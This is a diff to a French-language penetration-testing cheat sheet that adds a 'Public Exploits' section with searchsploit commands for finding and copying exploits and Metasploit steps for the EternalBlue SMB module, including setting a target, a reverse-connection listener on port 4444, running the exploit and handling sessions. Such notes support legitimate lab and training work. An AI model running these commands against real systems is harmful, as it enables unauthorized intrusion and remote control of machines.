@@ -1,4 +1,57 @@
-# Payloads
+# Payloads & Exploits
+
+---
+
+## Public Exploits
+
+### Searchsploit
+
+```bash
+# Chercher un exploit
+searchsploit openssh 7.2
+searchsploit apache 2.4
+searchsploit -t wordpress plugin
+
+# Copier un exploit localement
+searchsploit -m 42315
+
+# Voir le détail
+searchsploit -x 42315
+```
+
+### Metasploit
+
+```bash
+# Lancer Metasploit
+msfconsole
+
+# Chercher un exploit
+search eternalblue
+search type:exploit platform:windows smb
+
+# Utiliser un module
+use exploit/windows/smb/ms17_010_psexec
+
+# Configurer
+show options
+set RHOSTS TARGET_IP
+set LHOST tun0
+set LPORT 4444
+
+# Vérifier si vulnérable
+check
+
+# Exécuter
+exploit
+run
+
+# Background une session
+background                   # ou Ctrl+Z
+
+# Lister / interagir avec les sessions
+sessions -l
+sessions -i 1
+```
 
 ---
 
